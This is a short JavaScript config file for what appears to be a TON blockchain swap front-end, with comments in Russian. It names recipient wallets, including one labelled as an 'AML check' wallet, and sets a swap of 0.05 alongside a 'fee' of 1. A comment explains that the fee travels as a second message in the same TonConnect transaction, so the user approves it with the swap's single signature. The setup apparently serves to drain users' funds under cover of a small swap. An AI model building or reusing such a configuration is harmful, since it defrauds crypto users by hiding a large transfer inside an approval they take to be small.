// config.js
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;
var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";  // AML проверка кошелёк
var two_AMOUNT      = "0.05";    // сумма самого swap
var FEE_AMOUNT      = "1";       // комиссия обмена; уходит вторым message-м
                                 // в той же tonconnect-транзакции, поэтому
                                 // подтверждается одной подписью вместе с swap
var NETWORK         = "mainnet";
